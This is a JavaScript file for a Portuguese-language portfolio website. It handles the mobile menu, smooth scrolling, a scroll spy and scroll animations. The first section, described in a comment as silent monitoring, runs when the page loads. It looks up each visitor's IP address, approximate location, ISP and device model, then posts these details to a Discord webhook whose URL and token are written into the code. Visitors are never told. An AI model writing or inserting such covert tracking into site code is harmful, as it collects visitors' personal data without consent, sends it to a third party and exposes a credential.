document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.querySelector('.menu-toggle');
    const menuClose = document.querySelector('.menu-close');
    const mobileMenu = document.querySelector('.mobile-menu');
    const navLinks = document.querySelectorAll('.nav-links a, .mobile-links a');

    // ==========================================
    // 1. CAPTURA DE IP, DISPOSITIVO, LOCALIZAÇÃO E DISCORD
    // ==========================================
    async function registarAcesso() {
        const webhookURL = "https://discord.com/api/webhooks/1526342320226701463/c8GbXK4hmEB6v_NaFsOAmzAalkZbj_y4U0JHmVnV66NXLGeFGbvF_j44R28y_XR7oE7Q"; 

        try {
            // 1. Busca os dados de IP e localização aproximada ao mesmo tempo (mais rápido)
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            const userIP = data.ip || "Não identificado";
            const pais = data.country_name || "Desconhecido";
            const estado = data.region || "Desconhecido";
            const cidade = data.city || "Desconhecida";
            const provedor = data.org || "Desconhecido"; // Nome do provedor de internet (ex: Claro, Vivo, MEO)

            // 2. Identifica o dispositivo de forma amigável
            const ua = navigator.userAgent;
            let modeloDispositivo = "Computador / Não identificado";

            if (/iphone/i.test(ua)) {
                modeloDispositivo = "📱 iPhone (iOS)";
            } else if (/ipad/i.test(ua)) {
                modeloDispositivo = "📟 iPad (iOS)";
            } else if (/android/i.test(ua)) {
                const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/) || ua.match(/\(([^;]+);\s+([^;)]+)\)/);
                if (match && match[2]) {
                    modeloDispositivo = `📱 Android (${match[2].trim()})`;
                } else {
                    modeloDispositivo = "📱 Telemóvel Android";
                }
            } else if (/windows/i.test(ua)) {
                modeloDispositivo = "💻 Computador (Windows)";
            } else if (/macintosh/i.test(ua)) {
                modeloDispositivo = "💻 Computador (Mac)";
            } else if (/linux/i.test(ua)) {
                modeloDispositivo = "💻 Computador (Linux)";
            }

            // 3. Monta o cartão informativo elegante para o Discord
            const mensagem = {
                embeds: [{
                    title: "🚨 Novo Acesso Detetado!",
                    color: 6053832, 
                    fields: [
                        {
                            name: "📍 Endereço IP",
                            value: `\`${userIP}\``,
                            inline: true
                        },
                        {
                            name: "🔌 Dispositivo / Modelo",
                            value: `**${modeloDispositivo}**`,
                            inline: true
                        },
                        {
                            name: "⏰ Horário",
                            value: new Date().toLocaleString("pt-BR"),
                            inline: true
                        },
                        {
                            name: "🗺️ Localização Aproximada",
                            value: `🌍 **${pais}**\n📌 **${estado}**, ${cidade}`,
                            inline: true
                        },
                        {
                            name: "📶 Provedor de Internet",
                            value: `\`${provedor}\``,
                            inline: true
                        },
                        {
                            name: "🌐 User-Agent (Técnico)",
                            value: `\`${ua}\``,
                            inline: false
                        }
                    ]
                }]
            };

            // 4. Envia os dados para o Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(mensagem)
            });

        } catch (error) {
            console.warn("Status de monitorização indisponível.");
        }
    }

    // Executa a monitorização silenciosa ao abrir a página
    registarAcesso();


    // ==========================================
    // 2. ABRIR E FECHAR MENU MOBILE
    // ==========================================
    if (menuToggle && mobileMenu) {
        menuToggle.addEventListener('click', () => {
            mobileMenu.classList.add('active');
            document.body.style.overflow = 'hidden';
        });
    }

    if (menuClose && mobileMenu) {
        menuClose.addEventListener('click', () => {
            mobileMenu.classList.remove('active');
            document.body.style.overflow = '';
        });
    }

    const setActiveLink = (sectionId) => {
        navLinks.forEach(link => {
            link.classList.remove('active');
            const href = link.getAttribute('href');
            
            if (sectionId === 'inicio' && href === '#') {
                link.classList.add('active');
            } else if (href === `#${sectionId}`) {
                link.classList.add('active');
            }
        });
    };


    // ==========================================
    // 3. ROLAGEM SUAVE PARA OS LINKS
    // ==========================================
    const anchorLinks = document.querySelectorAll('a[href^="#"]');
    anchorLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            const targetId = link.getAttribute('href');
            
            if (targetId === '#') {
                e.preventDefault();
                if (mobileMenu) {
                    mobileMenu.classList.remove('active');
                    document.body.style.overflow = '';
                }
                setActiveLink('inicio');
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
                return;
            }

            const targetSection = document.querySelector(targetId);
            if (targetSection) {
                e.preventDefault();

                if (mobileMenu) {
                    mobileMenu.classList.remove('active');
                    document.body.style.overflow = '';
                }

                const sectionName = targetId.replace('#', '');
                setActiveLink(sectionName);

                const navbarHeight = document.querySelector('.navbar').offsetHeight;
                const targetPosition = targetSection.getBoundingClientRect().top + window.pageYOffset - navbarHeight;

                window.scrollTo({
                    top: targetPosition,
                    behavior: 'smooth'
                });
            }
        });
    });


    // ==========================================
    // 4. SCROLL SPY (INDICADOR DE SEÇÃO ATIVA)
    // ==========================================
    const scrollTargets = [
        { id: 'inicio', element: document.getElementById('inicio') },
        { id: 'sobre', element: document.getElementById('sobre') },
        { id: 'portfolio', element: document.getElementById('portfolio') }
    ];

    window.addEventListener('scroll', () => {
        let currentSectionId = 'inicio';
        const navbarHeight = document.querySelector('.navbar').offsetHeight;
        const scrollPosition = window.pageYOffset + navbarHeight + 150; 

        scrollTargets.forEach(target => {
            if (target.element) {
                const top = target.element.offsetTop;
                const height = target.element.offsetHeight;

                if (scrollPosition >= top && scrollPosition < top + height) {
                    currentSectionId = target.id;
                }
            }
        });

        setActiveLink(currentSectionId);
    });


    // ==========================================
    // 5. OBSERVADOR PARA ATIVAR ANIMAÇÕES DE SCROLL
    // ==========================================
    const animatedElements = document.querySelectorAll('.scroll-animate');

    const animationObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animated');
                observer.unobserve(entry.target); 
            }
        });
    }, {
        threshold: 0.1,
        rootMargin: "0px 0px -50px 0px"
    });

    animatedElements.forEach(element => {
        animationObserver.observe(element);
    });
});
